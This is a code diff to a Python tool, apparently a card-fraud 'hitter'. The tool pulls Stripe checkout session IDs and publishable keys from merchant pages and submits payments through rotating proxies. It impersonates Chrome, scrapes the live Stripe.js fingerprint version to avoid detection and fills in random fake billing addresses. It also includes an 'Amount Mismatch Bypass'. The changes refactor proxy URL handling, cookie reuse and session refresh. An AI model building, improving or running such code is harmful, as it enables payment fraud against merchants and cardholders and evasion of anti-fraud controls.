@@ -78,7 +78,7 @@ class StripeAPIExtractor:
         patterns = [r'/c/pay/(cs_[a-z]+_[a-zA-Z0-9]+)', r'/payment_pages/(cs_[a-z]+_[a-zA-Z0-9]+)', r'cs_[a-z]+_[a-zA-Z0-9]+']
         for pattern in patterns:
             match = re.search(pattern, url)
-            if match: return match.group(1) if '(' in pattern else match.group(0)
+            if match: return match.group(1) if match.lastindex else match.group(0)
         match = re.search(r'cs_[a-z]+_[a-zA-Z0-9]+', html)
         return match.group(0) if match else None
     
@@ -87,7 +87,7 @@ class StripeAPIExtractor:
         patterns = [r'pk_[a-z]+_[a-zA-Z0-9]+', r'"publishableKey":"(pk_[a-z]+_[a-zA-Z0-9]+)"', r'data-stripe-publishable-key="(pk_[a-z]+_[a-zA-Z0-9]+)"']
         for pattern in patterns:
             match = re.search(pattern, html)
-            if match: return match.group(1) if '(' in pattern else match.group(0)
+            if match: return match.group(1) if match.lastindex else match.group(0)
         return None
     
     @staticmethod
@@ -111,9 +111,8 @@ class StripeAPIExtractor:
             proxy_data = await ProxyManager.get_random(user_id)
             proxies = None
             if proxy_data:
-                auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
-                proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
-                proxies = {"http": proxy_url, "https": proxy_url}
+                proxy_url = ProxyManager.format_proxy_url(proxy_data)
+                proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
                 
             loop = asyncio.get_event_loop()
             response = await loop.run_in_executor(None, lambda: cffi_requests.post(url, headers=headers, data=data, proxies=proxies, timeout=5, impersonate="chrome131"))
@@ -272,6 +271,22 @@ class StripeAPIExtractor:
 # ============= BASE AUTOFILL =============
 class ProxyManager:
     db_pool = None
+
+    @classmethod
+    def format_proxy_url(cls, proxy_data: Optional[Dict]) -> Optional[str]:
+        if not proxy_data:
+            return None
+        server = proxy_data.get('server', '')
+        if not server:
+            return None
+        auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
+        s_lower = server.lower()
+        if s_lower.startswith(('socks5://', 'socks5h://', 'http://', 'https://')):
+            scheme, rest = server.split('://', 1)
+            if auth and '@' not in rest:
+                return f"{scheme}://{auth}{rest}"
+            return server
+        return f"http://{auth}{server}"
 
     @classmethod
     async def init_db(cls, db_pool):
@@ -491,6 +506,11 @@ class RandomData:
                                     address["zip"] = addr_data["zip"]
                                     address["city"] = addr_data["city"]
                                     address["state"] = addr_data["state"]
+                                else:
+                                    address["country"] = new_country
+                                    address["zip"] = "10000" if len(new_country) == 2 else "1000"
+                                    address["city"] = "Capital"
+                                    address["state"] = "Central"
             except: pass
             
         locale = locales.get(address["country"], "en-US")
@@ -626,11 +646,13 @@ def extract_intent_details(d):
 
 class StripeAPIHitter:
     _live_js_hash_cache = None
+    _live_js_hash_ts = 0
 
     @staticmethod
     def _fetch_live_stripe_js_hash():
-        """Scrape the real Stripe.js fingerprint version from the live CDN script once per session."""
-        if StripeAPIHitter._live_js_hash_cache:
+        """Scrape the real Stripe.js fingerprint version from the live CDN script once per session (30-min TTL)."""
+        now = time.time()
+        if StripeAPIHitter._live_js_hash_cache and (now - StripeAPIHitter._live_js_hash_ts < 1800):
             return StripeAPIHitter._live_js_hash_cache
         try:
             import re as _re_hash
@@ -641,16 +663,19 @@ class StripeAPIHitter:
                 ver_match = _re_hash.search(r'([0-9]+\.[0-9]+\.[0-9]+)["\']\s*\+\s*["\']_js_fp', text)
                 if ver_match:
                     StripeAPIHitter._live_js_hash_cache = ver_match.group(1)
+                    StripeAPIHitter._live_js_hash_ts = now
                     return StripeAPIHitter._live_js_hash_cache
                 # Fallback: look for version pattern near fingerprint references
                 ver_match2 = _re_hash.search(r'tag:\s*["\']([0-9]+\.[0-9]+\.[0-9]+)_js_fp', text)
                 if ver_match2:
                     StripeAPIHitter._live_js_hash_cache = ver_match2.group(1)
+                    StripeAPIHitter._live_js_hash_ts = now
                     return StripeAPIHitter._live_js_hash_cache
         except Exception:
             pass
         # Fallback: recent known-good FP version
         StripeAPIHitter._live_js_hash_cache = "6.0.0"
+        StripeAPIHitter._live_js_hash_ts = now
         return StripeAPIHitter._live_js_hash_cache
 
     def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None, profile: dict = None):
@@ -801,9 +826,8 @@ class StripeAPIHitter:
                 proxies = None
                 if proxy_data:
                     result['proxy_raw'] = proxy_data['raw']
-                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
-                    proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
-                    proxies = {"http": proxy_url, "https": proxy_url}
+                    proxy_url = ProxyManager.format_proxy_url(proxy_data)
+                    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
 
                 is_pi = isinstance(self.cs_live, str) and self.cs_live.startswith('pi_')
                 is_seti = isinstance(self.cs_live, str) and self.cs_live.startswith('seti_')
@@ -842,9 +866,12 @@ class StripeAPIHitter:
                 if proxies:
                     _cffi_session.proxies = proxies
 
-                if cached_cookies and _cffi_session_opened:
-                    for ck_name, ck_val in cached_cookies.items():
-                        _cffi_session.cookies.set(ck_name, ck_val)
+                if cached_cookies:
+                    if isinstance(cached_cookies, dict):
+                        _cffi_session.cookies.update(cached_cookies)
+                    elif hasattr(cached_cookies, 'items'):
+                        for ck_name, ck_val in cached_cookies.items():
+                            _cffi_session.cookies.set(ck_name, ck_val)
 
                 # Step 0.1: Browser Session Warm-Up
                 # Get the initial checkout page to populate cookie jar with __stripe_mid and other cookies.
@@ -969,7 +996,8 @@ class StripeAPIHitter:
                 # Uses persistent _cffi_session so cookies from warmup are forwarded.
                 # Stripe-Version header is required — real Stripe.js always sends it; missing it flags non-browser.
                 try:
-                    elements_url = f"https://api.stripe.com/v1/elements/sessions?key={self.pk_live}&locale={locale}&type=payment&payment_pages_checkout_session={self.cs_live}"
+                    el_type = "setup" if (self.raw_amount is None or self.raw_amount == 0 or is_seti) else "payment"
+                    elements_url = f"https://api.stripe.com/v1/elements/sessions?key={self.pk_live}&locale={locale}&type={el_type}&payment_pages_checkout_session={self.cs_live}"
                     el_headers = headers.copy()
                     el_headers["referer"] = checkout_page_url
                     el_headers["accept-language"] = "en-US,en;q=0.9"
@@ -1107,14 +1135,14 @@ class StripeAPIHitter:
                 # Unified Amount Mismatch Bypass
                 # Check response.status_code != 200 OR check if error payload returned in response json dict
                 has_amount_mismatch = False
-                if confirm_res.status_code != 200 and (err_code == 'checkout_amount_mismatch' or 'expected amount' in err_msg.lower() or 'expected_amount' in err_msg):
+                if confirm_res.status_code != 200 and (err_code == 'checkout_amount_mismatch' or 'expected amount' in err_msg.lower() or 'expected_amount' in err_msg.lower()):
                     has_amount_mismatch = True
                 elif confirm_res.status_code == 200:
                     temp_err = confirm_json.get('error', {})
                     if temp_err:
                         temp_code = temp_err.get('code')
                         temp_msg = temp_err.get('message', '') or ''
-                        if temp_code == 'checkout_amount_mismatch' or 'expected amount' in temp_msg.lower() or 'computed invoice' in temp_msg.lower() or 'expected_amount' in temp_msg:
+                        if temp_code == 'checkout_amount_mismatch' or 'expected amount' in temp_msg.lower() or 'computed invoice' in temp_msg.lower() or 'expected_amount' in temp_msg.lower():
                             has_amount_mismatch = True
                             err_code = temp_code
                             err_msg = temp_msg
@@ -1545,9 +1573,8 @@ class ConcurrentHitter:
                 proxy_data = await ProxyManager.get_random(self.user_id)
                 proxies = None
                 if proxy_data:
-                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
-                    proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
-                    proxies = {"http": proxy_url, "https": proxy_url}
+                    proxy_url = ProxyManager.format_proxy_url(proxy_data)
+                    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
                 
                 loop = asyncio.get_event_loop()
                 s = cffi_requests.Session(impersonate="chrome131", proxies=proxies)
@@ -1643,9 +1670,8 @@ class ConcurrentHitter:
                 proxy_data = await ProxyManager.get_random(self.user_id)
                 proxies = None
                 if proxy_data:
-                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
-                    proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
-                    proxies = {"http": proxy_url, "https": proxy_url}
+                    proxy_url = ProxyManager.format_proxy_url(proxy_data)
+                    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
                 
                 if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Fast-analyzing Stripe endpoint..."})
                 
@@ -1711,6 +1737,9 @@ class ConcurrentHitter:
                 async with self._session_lock:
                     fresh = await self._fetch_fresh_session()
                 if fresh:
+                    if fresh.get('cs_token') != cs_token or fresh.get('pk_key') != pk_key:
+                        self._stripe_tokens = None
+                        self._session_cookies = None
                     cs_token = fresh['cs_token']
                     pk_key = fresh['pk_key']
                     # Re-fetch payment data for the fresh session to get correct amount
